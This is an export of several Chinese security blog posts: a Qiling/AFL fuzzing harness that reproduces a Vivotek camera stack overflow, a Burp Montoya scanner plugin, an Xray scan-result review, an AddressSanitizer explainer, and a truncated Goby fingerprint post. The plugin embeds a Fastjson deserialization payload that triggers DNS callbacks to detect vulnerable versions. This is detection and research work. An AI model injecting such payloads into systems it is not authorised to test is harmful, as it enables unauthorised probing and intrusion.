ql.hook_code(simple_diassembler, begin=0x0180FC, end=0x018600, user_data=ql.arch.disassembler)\n\n    try:\n        # ql.debugger = True\n        ql.run(begin=0x0180FC+4, end=0x018600)    #注意arm函数返回地址比较奇怪，不一定在函数末尾\n        os._exit(0)\n    except:\n        if trace:\n            print(\"\\nFuzzer Went Shit\")\n        os._exit(0)  \n\nif __name__ == \"__main__\":\n    if len(sys.argv) == 1:\n        raise ValueError(\"No input file provided.\")\n    \n    os.chdir('/home/iot/workspace/Emulator/qiling-dev/vivetok')\n    if len(sys.argv) &gt; 2 and sys.argv[1] == \"-t\":\n        main(sys.argv[2], trace=True)\n    else:\n        main(sys.argv[1])\n\n这里很坑的一点是，在漏洞中因为Content-Length成员不以\\n结尾时就会让v31等于0会让strncpy报错但是不一定是pc指针错误，而是某些指令地址操作数问题\nv30 = strstr(haystack, \"Content-Length\");\nv31 = strchr(v30, '\\n');\nv32 = strchr(v30, ':');\nstrncpy(dest, v32 + 1, v31 - (v32 + 1));\n\n在源码中AFL模块调用以下函数完成fuzz执行：\ndef _dummy_fuzz_callback(_ql: \"Qiling\"):\n            if isinstance(_ql.arch, QlArchARM):\n                pc = _ql.arch.effective_pc\n            else:\n                pc = _ql.arch.regs.arch_pc\n            try:\n                _ql.uc.emu_start(pc, 0, 0, 0)\n            except UcError as e:\n                os.abort() \t\t\t\t#添加部分\n                return e.errno\n            \n\n因此添加os.abort通知AFL程序崩溃\n效果\nFuzz sys_read上面直接对buf写入Fuzz数据肯定不是一个很理想的办法(比如Fuzz数据超出读取长度)，当然人家给的例子就是这么Fuzz的也不失一种方法；之后\n就尝试利用Qiling的系统调用劫持功能让Fuzz效果更好。\n从read函数调用处开始执行，在这之前劫持read函数调用让程序直接读取文件输入：\ndef read_syscall(ql: Qiling, fd: int, buf: int, size: int, *args) -&gt; int:\n    # print(fd, buf, size)\n    data = ql.os.stdin.read(size)\n    # print(data)\n    ql.mem.write(buf, data)\n    return len(data)\n\ndef place_input_callback(_ql: Qiling, input: bytes, _):\n    # print(b\"**************** \" + input)\n    ql.os.stdin.write(input)\n\n    return True\n\n\ndef start_afl(_ql: Qiling):\n    \"\"\"\n    Callback from inside\n    \"\"\"\n    ql_afl_fuzz(_ql, input_file=input_file, place_input_callback=place_input_callback, exits=[0x018398])\n\n效果同样写个脚本把服务并且设置debugger等待gdb连接：\n\n然后将crash中的数据发送：\n\n也确实触发到了漏洞：\n0x900a5d74 in strncpy () from target:/lib/libc.so.0\ngef➤  backtrace \n#0  0x900a5d74 in strncpy () from target:/lib/libc.so.0\n#1  0x0001853c in ?? ()\nBacktrace stopped: previous frame identical to this frame (corrupt stack?)\ngef➤  \n\n技巧fuzz过程中不好调试连写的harness有没有效果都不知道，可以使用capstone同步解析执行汇编情况：\ndef simple_diassembler(ql: Qiling, address: int, size: int, md: Cs) -&gt; None:\n    buf = ql.mem.read(address, size)\n\n    for insn in md.disasm(buf, address):\n        ql.log.debug(f':: {insn.address:#x} : {insn.mnemonic:24s} {insn.op_str}')\n\n参考\nDemo - Qiling Framework Documentation\nIOT Fuzz 两种思路\nvivetok 摄像头远程栈溢出漏洞分析-安全客 - 安全资讯平台 (anquanke.com)\nVivotek远程栈溢出漏洞分析与复现 - 先知社区 (aliyun.com)\nhttp://galaxylab.com.cn/%e5%9f%ba%e4%ba%8eunicorn%e5%92%8clibfuzzer%e7%9a%84%e6%a8%a1%e6%8b%9f%e6%89%a7%e8%a1%8cfuzzing/\nhttp://galaxylab.pingan.com.cn/%E5%9F%BA%E4%BA%8E-unicorn-%E7%9A%84%E5%8D%95%E4%B8%AA%E5%87%BD%E6%95%B0%E6%A8%A1%E6%8B%9F%E6%89%A7%E8%A1%8C%E5%92%8C-fuzzer-%E5%AE%9E%E7%8E%B0/\n\n","slug":"Qiling partial fuzz I","date":"2023-01-30T04:38:45.000Z","categories_index":"Fuzz","tags_index":"Fuzz","author_index":"RainSec"},{"id":"6412321264c6d157e1df07971f4aa071","title":"Burp-Montoya","content":"  Burp的新版本更新了新的API接口，刚好最近有写插件的想法，所以简单的了解了下。\n\n简介  单从文档界面来看，结构清晰了不少-&gt;MontoyaApi\n\n  同时官方提供了一个demo\n使用  与老版本类似，创建一个插件项目需要继承类BurpExtension，它只包含了一个初始化函数\npublic interface BurpExtension {\n    void initialize(MontoyaApi var1);\n}\n  同样的，想要调用扫描等功能，也需要进行注册，比如我们注册一个扫描\npublic void initialize(MontoyaApi montoyaApi) {\n    this.montoyaApi = montoyaApi;\n    montoyaApi.scanner().registerScanCheck(new FastjsonCheck());\n}\n\npublic class FastjsonCheck implements ScanCheck {\n    @Override\n    public List&lt;AuditIssue&gt; activeAudit(HttpRequestResponse httpRequestResponse, AuditInsertionPoint auditInsertionPoint) {\n        return null;\n    }\n    @Override\n    public List&lt;AuditIssue&gt; passiveAudit(HttpRequestResponse httpRequestResponse) {\n        return null;\n    }\n    @Override\n    public ConsolidationAction consolidateIssues(AuditIssue auditIssue, AuditIssue auditIssue1) {\n        return null;\n    }\n}\n  与之前类似，activeAudit主动，passiveAudit被动，consolidateIssues定义重复问题的展示规则。具体扫描逻辑与旧版本就大同小异了，不过新版本调用某些方法变得更加方便了，比如调用collaborator:\nCollaboratorClient collaboratorClient = montoyaApi.collaborator().createClient();\n//生成域名链接\nString payload = collaboratorClient.generatePayload().toString();\n//访问域名操作\n......\n//检查记录\nList&lt;Interaction&gt; interactions = collaboratorClient.getAllInteractions();\n  报告的展示与旧版本基本相同，感觉只是变了名称\nimport burp.api.montoya.http.HttpService;\nimport burp.api.montoya.http.message.MarkedHttpRequestResponse;\nimport burp.api.montoya.scanner.audit.issues.AuditIssue;\nimport burp.api.montoya.scanner.audit.issues.AuditIssueConfidence;\nimport burp.api.montoya.scanner.audit.issues.AuditIssueDefinition;\nimport burp.api.montoya.scanner.audit.issues.AuditIssueSeverity;\n\nimport java.util.Arrays;\nimport java.util.List;\n\n/**\n * @program: BurpMontoya\n * @description:\n * @author: Noel\n * @create: 2022-09-21 01:35\n **/\npublic class ExampleAudit implements AuditIssue {\n    private String name;\n    private String detail;\n    private HttpService httpService;\n    private MarkedHttpRequestResponse[] requestResponses;\n    private AuditIssueConfidence confidence;\n    private AuditIssueSeverity severity;\n    private String baseurl;\n\n    public ExampleAudit(String name, String detail, HttpService httpService, MarkedHttpRequestResponse[] requestResponses, AuditIssueSeverity severity, AuditIssueConfidence confidence, String baseurl){\n        this.name = name;\n        this.detail = detail;\n        this.httpService = httpService;\n        this.requestResponses = requestResponses;\n        this.severity = severity;\n        this.confidence = confidence;\n        this.baseurl = baseurl;\n    }\n\n\n\n    @Override\n    public String name() {\n        return name;\n    }\n\n    @Override\n    public String detail() {\n        return detail;\n    }\n\n    @Override\n    public String remediation() {\n        return null;\n    }\n\n    @Override\n    public HttpService httpService() {\n        return httpService;\n    }\n\n    @Override\n    public String baseUrl() {\n        return baseurl;\n    }\n\n    @Override\n    public AuditIssueSeverity severity() {\n        return severity;\n    }\n\n    @Override\n    public AuditIssueConfidence confidence() {\n        return confidence;\n    }\n\n    @Override\n    public List&lt;MarkedHttpRequestResponse&gt; requestResponses() {\n        return Arrays.asList(requestResponses);\n    }\n\n    @Override\n    public AuditIssueDefinition definition() {\n        return null;\n    }\n\n}\n  这些结合起来便可以完成一个Burp插件的开发了\n实例  前段时间出了Fastjson 1.2.80的利用与检测方式，刚好我们拿来做一个Fastjson检测的插件,payload如下:\n[\n    {\n        \"@type\":\"java.lang.Exception\",\"@type\":\"com.alibaba.fastjson.JSONException\",\n\t\t\"x\":{\n\t\t\t\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"80.DNS\"} //  fastjson &lt; 1.2.83\n\t\t}\n    },\n    {\n        \"@type\":\"java.lang.Exception\",\"@type\":\"com.alibaba.fastjson.JSONException\",\n\t\t\"message\":{\n\t\t\t\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"83_.DNS\"} // fastjson = 1.2.83\n\t\t}\n    }\n]\n  如果 fastjson版本低于1.2.83，DNS只会收到一个80开头的请求，方便我们进行版本判断。我们的检测思路就是遇到json格式的body或者param就全部替换为payload，具体操作如下：\n\n获取请求详情\n\nHttpRequest request = httpRequestResponse.httpRequest();\n\n获取参数\nList&lt;ParsedHttpParameter&gt; parameters = request.parameters();\n\n判断参数值是否为json格式\n\n//utilities.urlUtils包含了对URL处理的函数，这里使用了decode，对URL进行解码\nutilities.urlUtils().decode(p.value()).startsWith(\"{\") ||utilities.urlUtils().decode(p.value()).startsWith(\"[\") \n\n生成collaboratorClient并发送请求\n\n//生成collaborator链接\nString payload = collaboratorClient.generatePayload().toString();\n\n// poc\nprivate String Fastjson_Payload = \"[\\n\" +\n        \"    {\\n\" +\n        \"        \\\"@type\\\":\\\"java.lang.Exception\\\",\\\"@type\\\":\\\"com.alibaba.fastjson.JSONException\\\",\\n\" +\n        \"\\t\\t\\\"x\\\":{\\n\" +\n        \"\\t\\t\\t\\\"@type\\\":\\\"java.net.InetSocketAddress\\\"{\\\"address\\\":,\\\"val\\\":\\\"fastjson80.%s\\\"} \\n\" +\n        \"\\t\\t}\\n\" +\n        \"    },\\n\" +\n        \"    {\\n\" +\n        \"        \\\"@type\\\":\\\"java.lang.Exception\\\",\\\"@type\\\":\\\"com.alibaba.fastjson.JSONException\\\",\\n\" +\n        \"\\t\\t\\\"message\\\":{\\n\" +\n        \"\\t\\t\\t\\\"@type\\\":\\\"java.net.InetSocketAddress\\\"{\\\"address\\\":,\\\"val\\\":\\\"fastjson83.%s\\\"} \\n\" +\n        \"\\t\\t}\\n\" +\n        \"    }\\n\" +\n        \"]\";\n//更新参数为我们的poc\nHttpRequest rq = request.withUpdatedParameters(HttpParameter.parameter(p.name(),utilities.urlUtils().encode(String.format(Fastjson_Payload, payload, payload)), p.type()));\n\n//发送请求\nHttpRequestResponse httpRequestResponse1 = http.issueRequest(rq);\n\n\n判断dns中是否包含有fastjson83\n\n// 获取Collaborator服务器中所有与payload有关的请求信息\nList&lt;Interaction&gt; interactions = collaboratorClient.getInteractions(InteractionFilter.interactionPayloadFilter(payload));\nfor (Interaction i :interactions) {\n// i.dnsDetails()获取一个DnsDetails的Optional对象，DnsDetails有两个方法，一个是获取dns查询的byte数组 d.query()\n// 利用byteUtils().indexOf查询是否包含fastjson83\n    flag = i.dnsDetails().filter(d -&gt;\n            utilities.byteUtils().indexOf(d.query(), utilities.byteUtils().convertFromString(\"fastjson83\")) &gt; 0\n    ).isPresent();\n\n}\n\n问题展示\n\nExampleAudit auditIssue = new ExampleAudit(\"Example\", \"Example detail\", request.httpService(),new MarkedHttpRequestResponse[]{httpRequestResponse.withNoMarkers(), httpRequestResponse1.withNoMarkers()}, AuditIssueSeverity.HIGH, AuditIssueConfidence.CERTAIN, request.url());\nauditIssues.add(auditIssue);\n至此一个burp插件算是完成了。\n问题DNS  在检测dns记录的时候遇到了一个问题，DNS数据包中.并不是ord('.')的格式\n\n  为了准确识别，采用了fastjson83而非fastjson83.payload\napi问题  目前新接口还在不断更新中，不是特别稳定。比如说文档中的DnsDetails会返回ByteArray类型  但是目前最新的burp接口中还是byte[]\n","slug":"Burp-Montoya","date":"2022-11-01T04:38:45.000Z","categories_index":"渗透测试","tags_index":"BurpSuite","author_index":"RainSec"},{"id":"7865cd0898eb778742478bf73fa460c6","title":"对Xray 5.6W条结果的简单分析","content":"对Xray 5.6W条结果的简单分析\n前言自动化扫描src已经做一段时间了，各类问题累计扫出来7.3w+，其中xray作为扫描漏洞的主力之一，上报了5.6w+问题 。目前应该是全网使用xray漏洞记录最多的一个了吧。\n这里便根据这5.6w+扫描结果来对xray做一个简单的分析及复盘，先说下我目前使用方式:\n扫描目标\n\n各大国内src相关资产\n\n扫描方式\n\ncrawlgergo爬取网站请求并发送到xray\nxray扫描爬取的网站请求将结果发送给webhook\nwebhook收集并报告漏洞\n\n简单来说就是: crawlgergo—-&gt;xray—-&gt;webhook\n开局套个盾\n\n统计结果仅包含src的资产，一般有src厂商的网站安全性要比普通厂商的安全性要高出很多，不同src对应厂商的安全性也不相同，分析结果仅供娱乐，不代表某个具体公司，亦不代表整体情况。\n随着扫描结果越来越多，后续根据我的扫描习惯关闭了一些误报过高和没有太大利用价值的插件，所以对于对于一些插件的统计结果是偏低的。\n本次取的是xray直接的报告结果，其中包含了xray的误报。\n\n正片本次统计漏洞总数为56666，这里将漏洞分为xray内置插件扫描和加载yaml插件扫描两类，其中\n\n内置插件漏洞数量：54507\nyaml插件漏洞数量：2159\n\nxray自带插件分析xray自带插件可以分为10个大类\n\ndirscan\nbaseline\nxss\nredirect\nbrute-force\nsqldet\njsonp\npath-traversal\ncmd-injection\ncrlf-injection\n\n细分总计有60个小类（ps:实际不止60，这里取的是报告结果统计出来的分类），具体如下\n\n对整体漏洞统计如下\ndirscan和baseline远高于其他插件，下面具体说说各类漏洞的情况及使用体验\nbaselinebaseline下面具体说说各类漏洞的情况及使用体验\n\nbaseline/cors/allow-https-downgrade/cors/allow-https-downgrade/cors/allow-https-downgrade\nbaseline/cors/allow-null-with-credential\nbaseline/cors/any-origin-with-credential\nbaseline/cors/reflected\nbaseline/sensitive/server-error\n\n其中server-error最多，达到20711条。baseline对自动化挖src来说，没有太多价值，为了减少干扰，后来直接在配置文件关掉这个大类检测，所以这块的实际统计是偏少的。\ndirscan感觉xray花了大量精力来做这个插件，直接分了45个小类，漏洞种类它占了三分之一\n由于分的太细，有些漏洞名字完全不知道干嘛的，这里根据具体的报告做了个简单的记录\n\n导致dirscan数量偏高的主要是以下4个插件，总计22971个。\n\ndirscan/debug/readme\ndirscan/sourcemap/default\ndirscan/sensitive/crossdomain\ndirscan/directory/default\n\n第一个第三个价值不大\n第二个是js.map泄漏，第四个是目录遍历，由于xray没做相关去重，一个网站有问题，那么连带着可能报上来几十甚至上百条报告。\n仔细梳理下来，dirscan细分了很多类，其实有些是相似的，可以合并到一起，分成两级其实更简洁明了。\ndiarscan中实际可直接利用的并不多，可以把其中的一些高价值或命中高价值关键字的漏洞做一些醒目的提醒，减少干扰。比如目录遍历的文件可进一步读取。泄漏密码或者其他重要配置。\n部分插件可以做进一步扫描的，比如发现phpmyadmin和tomcat可以尝试爆破。\ngit/svn插件误报有点多。\nsqldetsql注入检测插件\n\nsqldet/blind-based/default\nsqldet/error-based/default\nsqldet/time-based/default\n\n报错注入，bool盲注，时间盲注都有检测。\n实际使用中扫出来过报错注入，在本地扫描的时候扫出来过被我漏掉的时间盲注。\n但是bool盲注，时间盲注在这套自动化测试流程中全是误报，而且误报特别多，后来直接关闭这俩检测，只保留了报错注入。\nxss基于语义化检测的检测逻辑，检测过程无明显流量特征，对于有防护的场景依然有很高的准确度。\n最开始的时候手工验证了很多报告，很多防御不严谨的都被识别出来了，基本上绕一下就能触发xss，算得上扫xss神器。\n可惜是国内的xss，还是反射型xss，有的还有条件限制。即时交了给的赏金还不够写报告的手工费。后来扫出来的越来越多，也懒得挨个看了，现在默认忽略xss漏洞。\nredirect检测payload设计的挺巧妙的，payload自带绕过能力，精确度也挺高。\n可惜不值钱，也被我当做默认忽略的漏洞之一了。\nbrute-force\nbrute-force/basic-auth/default\nbrute-force/form-brute/default\n\n这个模块，基本都是误报= =.\nbasic-auth报告3个全是误报，form-brute报告378条具体正确多少个忘记了，但不超过5个，这个插件怎么说呢，关掉吧，万一命中一个说不准就是个高危漏洞，不关吧，命中率实在感人，自己写一个吧，不经过大量测试写出来的命中率估计还不如这个呢。。\njsonp扫出来的结果并不多，且利用价值都不高。纯依靠插件来检测这类漏洞中高价值的还是有点难度的。\ncmd-injection、crlf-injection、path-traversal这三个的报告很少，而且报上来的也是全是误报。\nxray加载的yaml插件分析\n\n\n\n\n\n\n\n\n在写这篇文章前的印象是除了两三个特别容易误报的插件外，其他插件相对较好的。然而在写这篇文章的时候重新整理了一下这些结果，发现这里面的误报真的多，很多插件直接全是误报。。。这里直接不展开分析了。\n简单说一下结果：\nyaml插件总计352个，有报告漏洞的插件共36个。\n将插件根据发现漏洞数量排序，原本想挑几个效果比较好的插件分析下的，结果发现好多插件插件误报率百分百，一直找到第20个才凑齐10个，直接放弃。（ps:这里说的是误报不是漏报，造成原因是目前扫描的目标里面没有这些漏洞。）\n这里放个排除掉误报比较高的插件后的前十插件占比。\n\nyaml插件估计是官方在审核插件的时候只是审核插件是否会漏报，并没有进行大范围的测试。\n后记最后简单总结下在这段时间使用下来后对于xray的评价\n先说优势\n\n在基础普通漏洞验证上做的相对完善。部分类型的漏洞验证方式及思路非常巧妙。\n支持额外加载yaml插件来补充其对1day漏洞的扫描能力\n有官方运营的社区，可不断补充1day插件\n\n然后缺点\n\n编译型语言的导致的硬伤，不如脚本语言灵活。只能通过解析yaml文件来进行poc编写，但yaml在应对复杂场景的检测局限性很大。\n针对新的影响范围较广的漏洞等的补充只能等待官方更新，比如log4j到目前都没有支持。\n不支持被动扫描插件编写。\n用于大范围扫描时很多插件误报严重。\n\n在最初了解到基于流量的被动扫描时就感觉这是个很好的漏洞扫描思路，能做的事情应该远高于传统扫描器。\nxray作为最火的被动扫描，在长时间使用下来的体验是相比传统扫描器有一定特色，除具备传统扫描器功能外，也有一定的灵活性。\n但由于其不开源，开放出来的版本本质还是基于传统漏洞和僵硬的1day扫描，无法完成被动扫描插件的开发，没有将被动扫描真正的灵活性完全的体现出来。想要完全发挥被动扫描的能力仍然需要配合其他的被动扫描工具。\n","slug":"Xray数据分析","date":"2022-10-12T11:48:45.000Z","categories_index":"渗透测试","tags_index":"","author_index":"RainSec"},{"id":"9830e1ecf0b844b9805cff1f477e18bc","title":"AddressSanitizer 漏洞检测技术剖析","content":"AddressSanitizer 漏洞检测技术剖析  类似AFL之类的Fuzzing技术不断强大的一个核心原因就是漏洞检测能力的不断增强，作为AFL这款经典工具的核心，ASAN的漏洞检测核心能力值得关注。\nASAN简介  ASAN其实本身是作为LLVM项目的一部分存在于Clang里面，其作用就是一个强大的内存错误检测器，它由一个编译插桩模块和一个运行时库组成，据官网介绍其可以检测以下类型的漏洞：\n\nOut-of-bounds accesses to heap, stack and globals.\nUse-after-free\nUse-after-return\nUse-after-scpe\nDouble-free, invalid free\nMemory leaks (experimental)\ninitialization order checking\n\n  ASAN的使用方法非常简单，在进行clang编译的时候加上-fsanitize=address参数，这样ASAN的run time library就会被链接到可执行文件里面，但是ASAN并不支持对于共享库的链接。显而易见的是使用ASAN会导致性能降低，因此需要配合clang的一些优化参数，关于这一部分本文只做简单的使用示范不追究其原理，因为作者在性能优化这块就是个彩笔。ASAN官方Demo：\nint main(int argc, char **argv) {\n  int *array = new int[100];\n  delete [] array;\n  return array[argc];  // BOOM\n}\n// clang++ -O1 -g -fsanitize=address -fno-omit-frame-pointer example_UseAfterFree.cc\n如果ASAN检测到一个bug之后就会把相关的信息打印出来，同时ASAN也会直接退出，这是因为：\n\n这使得ASAN在编译插桩阶段产生更小更快的代码。\n一旦产生内存异常，程序就会进入inconsistent state（大致意思就是跟原来程序员预想的状态不同），这就会导致如果不终止ASAN就可能其在接下来的运行中产生误报。\n\n这就是ASAN的基本用法了，关于使用可以看参考链接。\n\n\n\n\n\n\n\n\n\n以下漏洞检测中，如果是简单常用的漏洞类型就不针对漏洞原理进行介绍，可以自行查找资料。\nASAN算法  ASAN主要是检测内存，所以其算法也主要是对内存操作，因此对于ASAN来说，其第一步要做的就是接管目标的内存管理。ASAN的具体做法是通过runtime library替代原有的malloc和free，同时将malloc分配的内存周围的区域标记为red-zones（red-zones内存状态被称为为（poisoned）中毒状态），同时将free掉的内存单独隔离并标记为中毒状态，并且每一次程序访问内存的操作都会被修改为如下：编译前：\n*address = ...;  // or: ... = *address;\n编译后：\nif (IsPoisoned(address)) {\n  ReportError(address, kAccessSize, kIsWrite);\n}\n*address = ...;  // or: ... = *address;\n那么此时会存在一些问题：\n\n如何快速实现IsPoisoned？\n如何更好的输出错误？\n所有的内存访问都应该被检查吗？（本文核心关注点）\n\nASAN官方专门回答了第三个问题，根据官方的解释，ASAN不应该插桩所有的内存访问，因为在程序的运行过程当中需要大量访问相同位置的内存，如下：\nvoid inc(int *a) {\n  (*a)++;\n}\n此时同时存在对同一个地址的访问和存储操作，事实上对于内存访问错误，只用检测其中的一次操作就够了，而像下面的代码逻辑：\nif (...)\n  *a = ...\n*a = ...\n或者：\n*a = ...\nif (...)\n  *a = ...\n  其实都是只用检测一次内存访问就够了，还有循环之类的操作，其实没必要对循环内的每一次内存访问全部都插桩处理，还有很多其它的优化情况比如变量的数据流传递过程中，没必要对未发生实际变量内存地址改变的情况下对每次一关于该变量的内存访问都做检查，又或者对于全局常量的内存访问检查很可能是没有意义的。根据官方解释，这些优化目前还没有完全应用到ASAN，有兴趣的可以自行探索一下。\n简单说一下ASAN的优化思路之后回到其内存管理，ASAN会将全部的虚拟内存分为两大部分：\n\nMain application memory：这块内存主要用于程序常规的内存分配。\nShadow memory：该内存区域保存着一些元数据，假如Main mem里面的某一个bit的数据被标记为中毒状态，那么在对应的Shadow memory里面都有所记录。\n\n这两种内存相互配合，因此一旦Main mem里面有内存被标记，那么对应的Shadow memory应该被快速计算出来。\nshadow_address = MemToShadow(address);\nif (ShadowIsPoisoned(shadow_address)) {\n  ReportError(address, kAccessSize, kIsWrite);\n}\n上面代码的意思应该是不允许存在多次中毒标记同一地址。\nMain mem和Shadow memory之间的映射关系是8字节的Main mem对应1字节的Shadow memory，这一点应该很好理解，存在这样一种机制的核心作用还是确定那些内存是可访问的，那些内存是不可访问的，关于具体的映射细节可以看这里，非常简单。\n接下来介绍，ASAN是如何报告错误的。\n\n复制内存异常地址到rax(eax)\nexecute ud2 (generates SIGILL) SIGILL是一个signal信号，当处理器遇到非法指令的时候就会发出该信号。该信号中断进程并进行core dump。\n\n  用一个字节编码异常地址访问类型和大小，全部的三个步骤大概需要5-6字节的机器码。通过上述内容已经基本了解堆内存的管理办法，那么栈内存该如何处理呢？Demo：\nvoid foo() {\n  char a[8];\n  ...\n  return;\n}\n编译插桩后：\nvoid foo() {\n  char redzone1[32];  // 32-byte aligned\n  char a[8];          // 32-byte aligned\n  char redzone2[24];\n  char redzone3[32];  // 32-byte aligned\n  int  *shadow_base = MemToShadow(redzone1);\n  shadow_base[0] = 0xffffffff;  // poison redzone1\n  shadow_base[1] = 0xffffff00;  // poison redzone2, unpoison 'a'\n  shadow_base[2] = 0xffffffff;  // poison redzone3\n  ...\n  shadow_base[0] = shadow_base[1] = shadow_base[2] = 0; // unpoison all\n  return;\n}\n  其处理办法也是类似的，将程序中分配的栈空间周围内存进行标记来观察接下来的代码访问过程中是否会存在内存越界操作。  在整个漏洞检测中除了内存监控算法之外，还有一个比较重要的就是call stack算法，关于call stack，ASAN主要收集以下三个事件相关的stack：\n\nmalloc and free\nThread create\nFailure\n\n 对于ASAN来说，其收集stack trace相关的信息是利用了LLVM项目里面的另一个工具llvm-symbolizer，llvm-symboilzer的作用是从命令行接收目标文件名和地址，然后打印地址对应的源码位置到标准输出。ASAN利用llvm-symboilzer可以将地址全部符号化，从而实现对stack trace的符号化记录，因此在report error的时候就可以看到更多详细信息。\n到此关于ASAN中内存相关的基础算法介绍结束，下面主要剖析具体漏洞类型的检测。\n漏洞检测OOB  通过对上述算法的了解我们就能知道OOB的检测来源于ASAN中的red zones算法。\nUAF  其实在上面的基本算法介绍完了之后就应该明白其UAF的检测原理，每一次的free之后，ASAN并不会直接释放内存，而是对其进行标记和隔离，那么下一次对释放内存进行访问时就可以被监视到，然后输出错误报告。\nUAR  默认条件下ASAN并不检测这个bug，这种类型的漏洞其实也很少被提及，可能是利用条件比较苛刻的原因（个人猜测），可以看下官方demo：\n// RUN: clang -O -g -fsanitize=address %t &amp;&amp; ./a.out\n// By default, AddressSanitizer does not try to detect\n// stack-use-after-return bugs.\n// It may still find such bugs occasionally\n// and report them as a hard-to-explain stack-buffer-overflow.\n\n// You need to run the test with ASAN_OPTIONS=detect_stack_use_after_return=1\n\nint *ptr;\n__attribute__((noinline))\nvoid FunctionThatEscapesLocalObject() {\n  int local[100];\n  ptr = &amp;local[0];\n}\n\nint main(int argc, char **argv) {\n  FunctionThatEscapesLocalObject();\n  return ptr[argc];\n}\n  对于这种漏洞的检测，ASAN其实采用的也是类似heap uaf的做法，但是在具体的实现方法上存在的差别还是很大的。对于栈帧比较了解的人应该清楚，一旦一个函数return，那么它的栈就会被回收然后在下一次栈分配的时候被重复利用，如此来看通过red-zones类似的方法显然是行不通的，ASAN的做法是将栈迁移到堆上：未迁移前：\nvoid foo() {\n  int local;\n  escape_addr(&amp;local);\n}\n迁移后：\nvoid foo() {\n  char redzone1[32];\n  int local;\n  char redzone2[32+28];\n  char *fake_stack = __asan_stack_malloc(&amp;local, 96);\n  poison_redzones(fake_stack);  // Done by the inlined instrumentation code.\n  escape_addr(fake_stack + 32);\n  __asan_stack_free(stack, &amp;local, 96)\n}\n  __asan_stack_malloc(real_stack, frame_size)函数会从fake stack（ASAN实现的一个thread-local heap-like structure）分配一个大小为framz_size的fake frame，所有的fake frame都来自未被标记为中毒状态的内存，但是如果被使用（如上demo）就会被poison_redzones标记。__asan_stack_free(fake_stack, real_stack, frame_size)函数则会将所有的fake frame标记为中毒状态并进行释放。那么如果存在UAR的时候会因访问被标记为中毒的内存而被检测出异常。  从上面可以看出这种检测方法还是挺消耗内存的，fake stack 分配器会为每个线程分配固定大小的内存，大小从2的6次方到2的16次方字节不等，每个线程对应的内存也会被分成一定数量的chunk，如果chunk被用完，那么接下来的栈分配就会使用程序原本的stack，此时的UAR检测也会实效，因此越好的检测效果就代表越高的内存消耗。\nUASUAS同样知名度不高，先看官方Demo：\n// RUN: clang -O -g -fsanitize=address -fsanitize-address-use-after-scope \\\n//    use-after-scope.cpp -o /tmp/use-after-scope\n// RUN: /tmp/use-after-scope\n\n// Check can be disabled in run-time:\n// RUN: ASAN_OPTIONS=detect_stack_use_after_scope=0 /tmp/use-after-scope\n\nvolatile int *p = 0;\n\nint main() {\n  {\n    int x = 0;\n    p = &amp;x;\n  }\n  *p = 5;\n  return 0;\n}\n  大致意思就是作用域内定义的变量在作用域外被访问，ASAN检测这种漏洞的办法是随着程序的执行流不断的标记被局部变量使用的内存，当执行流到达一个作用域的时候，相关局部变量的内存被标记为good，当执行流到达一个作用域的结尾时，相关内存被标记为bad，看下面的demo：编译前：\nvoid f() {\n  int *p;\n  if (b) {\n    int x[10];\n    p = x;\n  }\n  *p = 1;\n}\n编译后：\nvoid f() {\n  int *p;\n  if (b) {\n    __asan_unpoison_stack_memory(x);\n    int x[10];\n    p = x;\n    __asan_poison_stack_memory(x);\n  }\n  *p = 1;\n   __asan_unpoison_stack_memory(frame);\n}\n因为栈是会被复用的，所以在函数return之前必须将相关内存取消中毒标记。\nDouble free and invalid free参考UAF。\nMemory leaks (experimental)  试验级别的先不说，ASAN专门集成了LeakSanitizer来研究这类漏洞的检测，可以参考这里。\ninitialization order checkingStatic initialization order fiasco，这在C++程序静态全局变量初始化过程中很常见。但是这种漏洞其实比较难以检测，因为C++静态全局变量的初始化出现在Main函数执行之前。至于漏洞模型，其实也很简单，假设在A.cpp和B.cpp里面分别存在两个全局静态类C和D，假设D在初始化过程中依赖C中的某些方法但是D初始化在C之前，那么就可能会导致crash。官方demo：\n$ cat tmp/init-order/example/a.cc\n#include &lt;stdio.h&gt;\nextern int extern_global;\nint __attribute__((noinline)) read_extern_global() {\n  return extern_global;\n}\nint x = read_extern_global() + 1;\nint main() {\n  printf(\"%d\\n\", x);\n  return 0;\n}\n\n$ cat tmp/init-order/example/b.cc\nint foo() { return 42; }\nint extern_global = foo();\n官方demo表明假如foo先初始化，那么就会输出43，否则就会输出1，间接表明了初始化顺序可能导致的一些安全问题。ASAN对于这里漏洞的扫描默认是关闭的，可以参考这里开启，它的检测方式分为很多种：\nLoose init-order checking  ASAN的这个检测方式很简单，就是在一个全局变量初始化过程中访问另一个全局变量之前检测要访问的全局变量是否已经完成初始化，但是很明显，这种动态检测在上述demo输出43的时候不会报告错误。\nStrict init-order checking  这个只是相对于Loose init-order checking更为严格了，只要进行访问就报告错误，这虽然能发现潜在的错误，但是也可能会触发误报。所以其实这两种方法各有千秋。为了解决这些问题，ASAN的此类漏洞扫描存在黑名单机制，把不想扫描的全局变量可以加入Blacklist来防止误报，但是可能会让漏洞研究人员多花点心思。\n参考链接\n\n\n\n\n\n\n\n\nhttps://clang.llvm.org/docs/AddressSanitizer.htmlhttps://github.com/google/sanitizers/wiki/AddressSanitizerhttps://isocpp.org/wiki/faq/ctors#static-init-order\n","slug":"AddressSanitizer","date":"2022-10-08T07:07:45.000Z","categories_index":"漏洞挖掘","tags_index":"漏洞挖掘","author_index":"RainSec"},{"id":"84026449195101da50b0cdf96b2a3940","title":"Goby指纹与POC提取复现","content":"Goby指纹与POC提取复现最近看了w8ay师傅发的关于提取Goby指纹的帖子，发现自己加入师傅的知识星球却一直没认真学习过实在是难顶嗷，根据师傅的帖子来复现自己提取一下，补上第一期的作业。\nGoby指纹提取首先是指纹提取，这里也分别准备了三个版本的Goby文件进行复现，分别是1.4.76、1.7.192和1.8.279\n1.4.76因为版本比较低所以不需要我们手动去从goby程序里提crules，直接用winhex打开笔者从事的工作与Yara息息相关，但是从来没有深入的去了解Yara的原理和流程，只是把它当作加强版的正则，从来没有想过能用来进行指纹识别，愧疚愧疚~~\n到这里已经看到出现指纹了，接下来就是将指纹提取出来，笔者在复现的时候起初以为自己写过Yara规则，猜测每个规则都是rule_id开头，然后后面跟字段，妹有好好观察，最后还是老老实实寻找开始和结束段。我们提取的内容应该是以rules_0开始，按照师傅的文章正是从default之后开始进行提取，所以开始字段为64 65 66 61 75 6C 74 00 ，往下寻找结束的标记，从图上可以看出结束的标记为66 